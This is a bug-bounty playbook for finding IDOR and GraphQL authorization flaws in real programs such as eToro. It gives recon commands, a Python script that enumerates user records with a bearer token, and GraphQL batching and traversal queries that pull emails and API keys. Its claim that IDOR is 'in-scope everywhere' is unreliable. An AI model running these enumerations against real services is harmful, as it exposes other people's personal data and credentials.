# 🎯 IDOR + API Hunting Playbook

> Your specialized hunting strategy: IDOR, GraphQL, API abuse → $5k-$25k+ payouts

---

## 📋 Quick Target Selection

**Sweet Spot Programs:**
- ✅ eToro (Fintech APIs, user data = IDOR goldmine)
- ✅ Certinia / FinancialForce (Enterprise SaaS, objects everywhere)
- ✅ Any SaaS with multi-tenant architecture
- ✅ Any platform with REST/GraphQL APIs

**Avoid:**
- ❌ Single-user tools (no IDOR surface)
- ❌ Static content sites (no logic to break)

---

## 🔍 Phase 1: Recon & API Discovery

### 1.1 Scope Mapping
```bash
# Extract all subdomains from scope
subfinder -d [target.com] -all | tee subdomains.txt

# Screenshot all subdomains
gowitness scan --nmap-xml nmap-output.xml 2>/dev/null

# Identify API endpoints
assetfinder [target.com] | grep -E 'api|v1|v2|graphql|gateway'
```

### 1.2 API Endpoint Enumeration
```bash
# GraphQL detection
# Try: /graphql, /graphql/, /api/graphql, /v1/graphql, /gql

# REST API endpoints
ffuf -w /usr/share/wordlists/discovery/api/objects.txt \
  -u https://api.target.com/v1/FUZZ \
  -mc 200,201,400,403 \
  -fs 0

# Hidden endpoints
ffuf -w /path/to/wordlist.txt \
  -u https://target.com/FUZZ \
  -mc 200,302,400,403
```

### 1.3 API Documentation Harvesting
- Check `/.well-known/openapi.json` or `swagger.json`
- Search `site:target.com filetype:json swagger`
- Look for `/docs`, `/api/docs`, `/swagger`
- GraphQL: Test `/graphql` with introspection query:
  ```graphql
  query { __schema { types { name } } }
  ```

---

## 🎯 Phase 2: IDOR Hunting

### 2.1 Identify Object IDs

**Common patterns:**
```
/api/v1/users/123           # User ID
/api/v1/orders/456          # Order ID
/api/v1/accounts/789        # Account ID
/api/v1/documents/abc123    # Document ID
/graphql?query=user(id:123) # GraphQL ID
```

**ID Discovery Methods:**
1. **Burp Proxy** — Capture authenticated requests, note all numeric/UUID parameters
2. **Grep for IDs** — Common names: `id`, `userId`, `accountId`, `objectId`, `requestId`, `invoiceId`
3. **API Response Mining** — Extract IDs from 200 responses, try incrementing them

### 2.2 IDOR Exploitation Workflow

**Step 1: Capture authenticated request**
```bash
# In Burp Repeater:
GET /api/v1/users/me
Authorization: Bearer [your_token]
```
Response shows your data with `userId: 12345`

**Step 2: Change ID to target a different user**
```bash
GET /api/v1/users/12346  # Try next ID
GET /api/v1/users/12347  # Sequential enumeration
GET /api/v1/users/99999  # Admin/high-value ID
```

**Step 3: Confirm data access**
- ✅ Did you get back another user's personal data?
- ✅ Email, phone, payment info, private documents?
- ✅ Can you read sensitive objects (invoices, medical records)?

### 2.3 GraphQL IDOR (Introspection OFF Strategy)

**When introspection is disabled:**

1. **Harvest operations from traffic**
   - Burp: Capture all GraphQL requests while using the app
   - Extract query patterns: `query GetUser($id: ID!) { user(id: $id) { ... } }`

2. **Enumerate IDs in GraphQL**
   ```graphql
   query {
     user(id: "12345") {
       id
       name
       email
       phone
     }
   }
   ```
   Try incrementing `id: "12346"`, `id: "12347"`, etc.

3. **Batch IDOR abuse** (if supported)
   ```graphql
   query {
     users(ids: ["1", "2", "3", "4", "5"]) {
       id
       email
       data
     }
   }
   ```

4. **Object relationship traversal**
   ```graphql
   query {
     account(id: "admin-account") {
       users { id email }
       invoices { amount }
       apiKeys { token }
     }
   }
   ```

---

## 💰 Phase 3: Impact Assessment & Severity

### Critical (CVSS 9.0+, $5k-$25k+)
- [ ] Account takeover (change password, email, 2FA)
- [ ] Financial data access (invoices, payment methods, balances)
- [ ] PII exposure (full name, SSN, address, phone, email)
- [ ] Admin/high-privilege account compromise
- [ ] Access to all users' data via enumeration

### High (CVSS 7.0-8.9, $1k-$5k)
- [ ] Read access to another user's private data
- [ ] Access to invoices, medical records, legal docs
- [ ] View payment methods / transaction history
- [ ] Access to user's API keys or tokens
- [ ] Read access affecting multiple users

### Medium (CVSS 4.0-6.9, $300-$1k)
- [ ] Limited data exposure (username, partial email)
- [ ] Read-only access to non-sensitive user data
- [ ] Information that enables further exploitation

---

## 🛠️ Exploitation Tools & Commands

### Burp Suite Workflow
```
1. Set up proxy (127.0.0.1:8080)
2. Login to target application
3. Burp Repeater → Capture authenticated request
4. Change ID parameter (e.g., userId from 123 → 456)
5. Send request
6. Check response for unauthorized data access
```

### Python Enumeration Script
```python
import requests
import sys

target = "https://api.target.com/v1"
endpoint = "/users"
auth_header = {"Authorization": "Bearer YOUR_TOKEN"}

for user_id in range(1000, 1100):
    try:
        resp = requests.get(
            f"{target}{endpoint}/{user_id}",
            headers=auth_header,
            timeout=5
        )
        if resp.status_code == 200:
            print(f"[+] User {user_id}: {resp.json()}")
        elif resp.status_code == 403:
            print(f"[-] User {user_id}: Forbidden (working controls)")
    except Exception as e:
        print(f"[!] Error {user_id}: {e}")
```

### Burp Intruder: Automated IDOR Testing
```
1. Send request to Intruder
2. Highlight ID parameter (Ctrl+I)
3. Payload Type: Numbers (1-1000)
4. Filter Status Code 200
5. Review responses for data leakage
```

---

## 📝 PoC Documentation Template

```markdown
## Vulnerability: Object-Level Authorization Bypass (IDOR)

### Summary
[Brief description of the vulnerability]

### Affected Endpoint
`GET /api/v1/users/{userId}`

### Steps to Reproduce
1. Login with test account (email: test@example.com)
2. Capture request to GET /api/v1/users/me → Returns userId: 12345
3. Change request to GET /api/v1/users/12346
4. Server returns another user's full PII without authorization check

### Impact
- Attackers can enumerate all users in the system
- Access to sensitive PII: email, phone, address
- Can read financial data: invoices, payment methods
- Potential account takeover if password reset is supported

### CVSS Score
9.1 (Critical) — High Confidentiality Impact

### Proof of Concept
[Screenshots, HTTP requests, response bodies]

### Remediation
- Implement proper authorization checks: verify user owns the object before returning
- Use UUIDs instead of sequential IDs
- Enforce role-based access control (RBAC)
```

---

## 🚨 Advanced Techniques

### IDOR + Privilege Escalation
```
1. Find admin user ID (often low, like ID: 1, 2, or via error messages)
2. Read admin's settings/configuration endpoint
3. Extract API keys, webhook URLs, feature flags
4. Escalate privileges via authorization manipulation
```

### GraphQL Batching Abuse
```graphql
query {
  user(id: "1") { email }
  user2: user(id: "2") { email }
  user3: user(id: "3") { email }
  user4: user(id: "4") { email }
  user5: user(id: "5") { email }
}
```
Enumerate thousands of users in a single request.

### Indirect IDOR
```
/api/v1/organizations/123/reports/456

Try changing just the organization ID:
/api/v1/organizations/124/reports/456

Can you read another org's reports?
```

---

## 📊 Hunting Checklist

### Per Target
- [ ] Map all API endpoints (REST + GraphQL)
- [ ] Identify all ID parameters
- [ ] Test 20-30 sequential IDs
- [ ] Test admin/system IDs (1, 2, 999, -1)
- [ ] Test UUIDs if applicable
- [ ] Check indirect IDOR (nested objects)
- [ ] Test GraphQL batching queries
- [ ] Test authorization headers removal
- [ ] Try different HTTP methods (GET → POST, PUT, PATCH)
- [ ] Check response codes (403 vs 404 leaks info)

### Findings to Track
- [ ] IDOR found? Severity? Payable?
- [ ] Can you escalate to account takeover?
- [ ] Can you access admin/privileged accounts?
- [ ] How many users affected?
- [ ] Reproducible without authentication?

---

## 💡 Pro Tips

**Speed wins.** Test 50 IDs in the first 10 minutes. If you find IDOR, you've already won.

**Don't overthink scope.** IDOR is in-scope everywhere. It's the foundation of authorization.

**Document everything.** Screenshots of the HTTP request + response = accepted submission.

**Respect rate limits.** 1-5 requests/second is safe. Don't DoS the target.

**Sequential IDs are goldmines.** Most devs auto-increment user/order/invoice IDs. Enumerate them first.

**Check 403 responses.** A 403 ("Forbidden") actually proves the endpoint exists and handles auth. A 404 ("Not Found") hides the endpoint.

---

## 🎬 Next Steps
1. Pick your target program on Bugcrowd
2. Map API scope
3. Run Phase 1 recon
4. Start IDOR testing on 10-15 endpoints
5. Submit high-confidence findings
6. Iterate on feedback

**Let's get paid.** 🔫💰
